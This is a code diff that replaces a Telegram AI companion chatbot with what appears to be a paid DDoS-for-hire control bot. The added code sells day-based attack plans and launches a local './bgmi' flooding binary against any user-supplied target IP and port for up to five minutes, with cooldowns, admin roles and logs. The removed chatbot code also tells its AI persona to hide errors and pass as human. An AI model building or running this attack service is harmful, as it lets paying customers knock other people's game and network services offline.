@@ -1,183 +1,143 @@
-import os
-import json
-from datetime import datetime
-import pytz
-import requests
+import telebot, subprocess, threading, time, os, json, datetime
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-from telegram import Update
-from telegram.ext import (
-    ApplicationBuilder,
-    CommandHandler,
-    MessageHandler,
-    ContextTypes,
-    filters,
-)
-
-from groq import Groq
-
-# =========================
-# ENV VARIABLES
-# =========================
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-GROQ_API_KEY = os.getenv("GROQ_API_KEY")
-HOLIDAY_API_KEY = os.getenv("HOLIDAY_API_KEY")  # INDIAN CALENDAR API
+bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
 
-# =========================
-# CORE IDENTITY
-# =========================
-BOT_NAME = "Miss Bloosm"
-DEVELOPER = "@Frx_Shooter"
-TIMEZONE = pytz.timezone("Asia/Kolkata")
+# ===== ROLES =====
+MAIN_ADMIN = "5436530930"
+ADMIN_PANEL = set()
+USERS_FILE = "users.json"
+LOG_FILE = "logs.txt"
 
-# =========================
-# GROQ CLIENT
-# =========================
-client = Groq(api_key=GROQ_API_KEY)
+ATTACK_LIMIT = 300        # 5 min
+COOLDOWN = 1200           # 20 min
 
-# =========================
-# LONG MEMORY (FILE)
-# =========================
-MEMORY_FILE = "memory.json"
-MAX_MEMORY = 200
+running = {}
+cooldown = {}
+admin_chat = {}
 
-if not os.path.exists(MEMORY_FILE):
-    with open(MEMORY_FILE, "w") as f:
-        json.dump({}, f)
+lock = threading.Lock()
 
-def load_memory():
-    with open(MEMORY_FILE, "r") as f:
-        return json.load(f)
+# ===== STORAGE =====
+def load_users():
+    if not os.path.exists(USERS_FILE):
+        return {}
+    return json.load(open(USERS_FILE))
 
-def save_memory(data):
-    with open(MEMORY_FILE, "w") as f:
-        json.dump(data, f, indent=2)
+def save_users(data):
+    json.dump(data, open(USERS_FILE,"w"))
 
-# =========================
-# TIME CONTEXT (IST)
-# =========================
-def ist_context():
-    now = datetime.now(TIMEZONE)
-    return now.strftime("%A, %d %B %Y | %I:%M %p IST")
+users = load_users()
 
-# =========================
-# INDIAN HOLIDAYS (API)
-# =========================
-def get_indian_holidays():
-    """
-    Uses API Ninjas style API:
-    https://api.api-ninjas.com/v1/holidays?country=IN&year=YYYY
-    """
-    year = datetime.now(TIMEZONE).year
-    url = f"https://api.api-ninjas.com/v1/holidays?country=IN&year={year}"
-    headers = {"X-Api-Key": HOLIDAY_API_KEY}
+# ===== HELPERS =====
+def role(uid):
+    if uid == MAIN_ADMIN:
+        return "MAIN"
+    if uid in ADMIN_PANEL:
+        return "ADMIN"
+    return "USER"
+
+def log(txt):
+    with open(LOG_FILE,"a") as f:
+        f.write(f"[{datetime.datetime.now()}] {txt}\n")
+
+# ===== INLINE MENU =====
+def menu(uid):
+    kb = InlineKeyboardMarkup(row_width=2)
+    kb.add(
+        InlineKeyboardButton("🚀 Start Attack", callback_data="bgmi"),
+        InlineKeyboardButton("📄 My Logs", callback_data="mylogs"),
+        InlineKeyboardButton("📋 Plan", callback_data="plan"),
+        InlineKeyboardButton("📞 Contact Admin", callback_data="contact"),
+    )
+    if role(uid) != "USER":
+        kb.add(InlineKeyboardButton("🛑 Stop All", callback_data="stopall"))
+    return kb
+
+# ===== ADMIN CHAT RELAY =====
+@bot.message_handler(func=lambda m: m.chat.id in admin_chat)
+def relay_user(m):
+    bot.send_message(MAIN_ADMIN, f"👤 User {m.chat.id}:\n{m.text}")
+
+@bot.message_handler(func=lambda m: str(m.chat.id)==MAIN_ADMIN and m.reply_to_message)
+def relay_admin(m):
+    try:
+        uid = m.reply_to_message.text.split()[2]
+        bot.send_message(uid, m.text)
+    except:
+        pass
+
+# ===== CALLBACKS =====
+@bot.callback_query_handler(func=lambda c: True)
+def cb(c):
+    uid=str(c.message.chat.id)
+    if c.data=="contact":
+        admin_chat[c.message.chat.id]=True
+        bot.send_message(c.message.chat.id,"💬 Admin chat enabled",reply_markup=
+            InlineKeyboardMarkup().add(
+                InlineKeyboardButton("❌ End Admin Chat",callback_data="endchat")
+            ))
+    elif c.data=="endchat":
+        admin_chat.pop(c.message.chat.id,None)
+        bot.send_message(c.message.chat.id,"✅ Admin chat closed",reply_markup=menu(uid))
+    elif c.data=="bgmi":
+        bot.send_message(c.message.chat.id,"Use:\n/bgmi <target> <port> <time>")
+    elif c.data=="plan":
+        bot.send_message(c.message.chat.id,
+            "💎 Plans\n\n"
+            "1 Day – ₹100\n"
+            "3 Days – ₹150\n"
+            "7 Days – ₹300\n\n(Contact admin)")
+    elif c.data=="stopall":
+        for p in running.values():
+            p.terminate()
+        running.clear()
+        bot.send_message(c.message.chat.id,"🛑 All attacks stopped")
+
+# ===== ATTACK =====
+@bot.message_handler(commands=["bgmi"])
+def bgmi(m):
+    uid=str(m.chat.id)
+
+    if role(uid)=="USER":
+        last=cooldown.get(uid)
+        if last and time.time()-last<COOLDOWN:
+            return bot.reply_to(m,"⏳ Cooldown active")
+
+    if uid in running:
+        return bot.reply_to(m,"⚠️ Attack already running")
 
     try:
-        r = requests.get(url, headers=headers, timeout=10)
-        data = r.json()
+        _,t,p,d=m.text.split()
+        d=int(d)
+        if d>ATTACK_LIMIT:
+            return bot.reply_to(m,"❌ Max 5 minutes")
+    except:
+        return bot.reply_to(m,"Usage: /bgmi <target> <port> <time>")
 
-        upcoming = []
-        today = datetime.now(TIMEZONE).date()
+    proc=subprocess.Popen(["./bgmi",t,p,str(d)])
+    running[uid]=proc
+    cooldown[uid]=time.time()
+    log(f"{uid} {t}:{p} {d}")
 
-        for item in data:
-            d = datetime.strptime(item["date"], "%Y-%m-%d").date()
-            if d >= today:
-                upcoming.append(f"{item['name']} ({d.strftime('%d %b')})")
+    bot.reply_to(m,f"🚀 Attack started\nTarget:{t}\nTime:{d}s")
 
-        return ", ".join(upcoming[:5]) if upcoming else "No upcoming holidays found"
+    def wait():
+        proc.wait()
+        running.pop(uid,None)
+        bot.send_message(uid,"✅ Attack finished")
+    threading.Thread(target=wait,daemon=True).start()
 
-    except Exception:
-        return None  # silent failure
+# ===== START =====
+@bot.message_handler(commands=["start","help"])
+def start(m):
+    bot.send_message(m.chat.id,"🤖 Control Panel",reply_markup=menu(str(m.chat.id)))
 
-# =========================
-# /START (ONLY FIXED MESSAGE)
-# =========================
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    intro = (
-        f"Hello, I’m {BOT_NAME} 🌸\n\n"
-        "I’m a calm, friendly AI designed for natural conversations.\n"
-        "Human Like Replay Feels Emotionas.\n\n"
-        "⚠️ This bot is currently in beta.\n"
-        "Some replies may not always be perfect."
-    )
-    await update.message.reply_text(intro)
-
-# =========================
-# MAIN CHAT (PURE AI ONLY)
-# =========================
-async def chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not update.message or not update.message.text:
-        return
-
-    user = update.effective_user
-    user_text = update.message.text.strip()
-
-    memory = load_memory()
-    uid = str(user.id)
-
-    if uid not in memory:
-        memory[uid] = []
-
-    # Save user message
-    memory[uid].append({"role": "user", "content": user_text})
-    memory[uid] = memory[uid][-MAX_MEMORY:]
-    save_memory(memory)
-
-    # Calendar context from API
-    
-    holidays_context = get_indian_holidays()
-
-    # SYSTEM PROMPT (ONLY MEMORY & CONTEXT)
-    system_prompt = (
-        f"You are {BOT_NAME}, a female AI assistant.\n"
-        f"Developer: {DEVELOPER}.\n\n"
-        "Purpose:\n"
-        "- Calm, friendly, professional conversation\n"
-        "- Human-like tone\n"
-        "- Light emojis allowed naturally\n\n"
-        "Rules:\n"
-        "- No automatic or scripted replies\n"
-        "- Never mention errors or technical issues\n"
-        "- If unsure, respond naturally like a human\n\n"
-        f"Current time (IST): {ist_context()}\n"
-    )
-
-    if holidays_context:
-        system_prompt += f"Upcoming Indian holidays: {holidays_context}\n"
-
-    messages = [{"role": "system", "content": system_prompt}]
-    messages.extend(memory[uid])
+# ===== RUN =====
+while True:
     try:
-        response = client.chat.completions.create(
-            model="llama-3.1-8b-instant",
-            messages=messages,
-            temperature=0.65,
-            max_tokens=200,
-        )
-
-        reply = response.choices[0].message.content.strip()
-
-        # Save assistant reply
-        memory[uid].append({"role": "assistant", "content": reply})
-        memory[uid] = memory[uid][-MAX_MEMORY:]
-        save_memory(memory)
-
-        await update.message.reply_text(reply)
-
-    except Exception:
-        # Bot stays silent on any failure
-        return
-
-# =========================
-# RUN BOT
-# =========================
-def main():
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
-
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, chat))
-
-    print("Miss Bloosm is running 🌸")
-    app.run_polling()
-
-if name == "main":
-    main()
+        bot.polling(none_stop=True)
+    except Exception as e:
+        print(e)
+        time.sleep(3)
